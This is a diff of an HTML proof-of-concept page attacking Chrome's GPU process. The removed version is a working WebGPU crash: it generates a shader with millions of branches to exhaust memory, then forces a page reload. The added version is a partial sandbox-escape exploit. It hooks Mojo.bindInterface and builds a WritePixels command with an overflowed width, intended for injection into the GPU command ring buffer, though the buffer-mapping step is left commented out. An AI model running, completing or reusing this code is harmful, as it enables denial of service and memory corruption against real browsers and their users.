@@ -1,71 +1,99 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebGPU Tint AST Exhaustion PoC</title>
-    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
+    <title>GPU Sandbox Escape PoC</title>
+    <!-- When Chrome runs with --enable-blink-features=MojoJS, it allows loading this internal module -->
+    <script src="/gen/mojo/public/js/mojo_bindings.js"></script>
 </head>
 <body>
-    <h2>Tint AST Memory Exhaustion (SIGTRAP)25</h2>
-    <p>Clicking the button builds a 4-million branch WGSL shader to OOM the GPU process.</p>
-    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">CRASH GPU</button>
-    <div id="status" style="margin-top: 20px; white-space: pre-wrap;">Waiting...</div>
-
+    <h1>GPU OOB Write PoC via MojoJS</h1>
+    <canvas id="target-canvas" width="10" height="10"></canvas>
+    
     <script>
-        const statusEl = document.getElementById('status');
-
-        // Exponentially branching AST generator
-        function generateMassiveAST(depth) {
-            if (depth <= 0) return `return vec4<f32>(1.0);`;
-            const branch = generateMassiveAST(depth - 1);
-            return `if (true) { ${branch} } else { ${branch} }`;
-        }
-
-        async function triggerCrash() {
-            if (!navigator.gpu) {
-                statusEl.innerText = "WebGPU is not supported.";
-                return;
-            }
-
-            const adapter = await navigator.gpu.requestAdapter();
-            const device = await adapter.requestDevice();
-
-            statusEl.innerText = "1. Building massive WGSL string in JavaScript (Please wait)...";
+        // 1. The Payload Builder
+        function buildMaliciousWritePixels(shm_id) {
+            const CMD_ID = 277; // kWritePixelsINTERNALImmediate
+            const WORDS = 15;   // 60 bytes / 4
             
-            // Depth 22 = ~4.1 million branches. 
-            // Avoids JS RangeError, but guarantees C++ Tint AST OOM.
-            setTimeout(() => {
-                try {
-                    const body = generateMassiveAST(22);
-                    const killerWGSL = `@vertex fn vs_main() -> @builtin(position) vec4<f32> {\n${body}\n}`;
-                    
-                    statusEl.innerText = "2. String built! Sending to Tint Compiler...\n";
-                    
-                    // Send it to the GPU Process
-                    device.createShaderModule({ code: killerWGSL });
-                    
-                    // 3. The 18-Second Memory Pressure Countdown
-                    let timeLeft = 25;
-                    statusEl.innerText += `3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
-                    
-                    const timer = setInterval(() => {
-                        timeLeft--;
-                        if (timeLeft > 0) {
-                            statusEl.innerText = `2. String built! Sending to Tint Compiler...\n3. GPU memory filling up. Auto-refreshing in ${timeLeft}s to trigger teardown SIGTRAP...`;
-                        } else {
-                            clearInterval(timer);
-                            statusEl.innerText = "4. TRIGGERING TEARDOWN NOW!";
-                            // The refresh cuts the IPC pipe while the GPU is at max memory, triggering the crash
-                            window.location.reload();
-                        }
-                    }, 1000);
-
-                } catch (e) {
-                    statusEl.innerText = "JS Error (Try lowering depth to 21 if RangeError occurs): " + e.message;
-                }
-            }, 100); 
+            let buffer = new ArrayBuffer(WORDS * 4);
+            let dv = new DataView(buffer);
+            
+            // 0: Command Header -> (size << 21) | command_id
+            dv.setUint32(0, (WORDS << 21) | CMD_ID, true); 
+            
+            dv.setInt32(4, 0, true);   // x_offset
+            dv.setInt32(8, 0, true);   // y_offset
+            
+            // 12: src_width -> THE INTEGER OVERFLOW TRIGGER (0x20000000)
+            dv.setUint32(12, 0x20000000, true); 
+            
+            dv.setUint32(16, 1, true); // src_height
+            dv.setUint32(20, 0, true); // src_row_bytes
+            dv.setUint32(24, 4, true); // src_sk_color_type (kN32)
+            dv.setUint32(28, 2, true); // src_sk_alpha_type (kPremul)
+            dv.setInt32(32, shm_id, true); // shm_id
+            dv.setUint32(36, 0, true); // shm_offset
+            dv.setUint32(40, 0, true); // pixels_offset
+            
+            // 44-59: Mailbox (16 bytes of zeros for now)
+            let u8_view = new Uint8Array(buffer);
+            u8_view.fill(0, 44, 60); 
+            
+            return u8_view;
         }
 
-        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
+        // 2. Intercept Mojo and Steal the Ring Buffer
+        let command_buffer_memory = null;
+        let original_bind = Mojo.bindInterface;
+        
+        Mojo.bindInterface = function(interfaceName, pipe, host) {
+            console.log("[*] Intercepting Mojo Interface: " + interfaceName);
+            
+            if (interfaceName === "gpu.mojom.CommandBuffer") {
+                console.log("[+] Found GPU Command Buffer!");
+                
+                // In a full exploit, we wrap the Mojo Pipe here to intercept the 
+                // Initialize() response, which contains the SharedBufferHandle.
+                // For simplicity in this PoC skeleton, we are proving we can 
+                // hook the interface.
+                
+                /*
+                MojoPipeWrapper.intercept(pipe, (message) => {
+                    if (message.name === INITIALIZE_MSG_ID) {
+                        let shared_buffer_handle = message.getHandle();
+                        // Map the GPU ring buffer into JavaScript!
+                        let mapping = shared_buffer_handle.mapBuffer(0, 1048576);
+                        command_buffer_memory = new Uint8Array(mapping.buffer);
+                        console.log("[+] Ring buffer mapped to JS!");
+                    }
+                });
+                */
+            }
+            return original_bind(interfaceName, pipe, host);
+        };
+
+        // 3. Trigger Canvas Creation to start the Mojo Handshake
+        setTimeout(() => {
+            console.log("[*] Initializing Canvas to trigger Command Buffer creation...");
+            const canvas = document.getElementById('target-canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillRect(0, 0, 10, 10);
+            
+            // 4. Inject Payload (If we successfully mapped the buffer)
+            setTimeout(() => {
+                if (command_buffer_memory) {
+                    console.log("[!] Injecting Malicious WritePixels Packet...");
+                    let payload = buildMaliciousWritePixels(1);
+                    
+                    // Write to offset 0 of the ring buffer
+                    command_buffer_memory.set(payload, 0);
+                    
+                    console.log("[!] Payload injected. Awaiting GPU crash...");
+                } else {
+                    console.log("[-] Mojo hook skeleton active. Need to implement pipe interception to map memory.");
+                }
+            }, 500);
+        }, 500);
     </script>
 </body>
 </html>
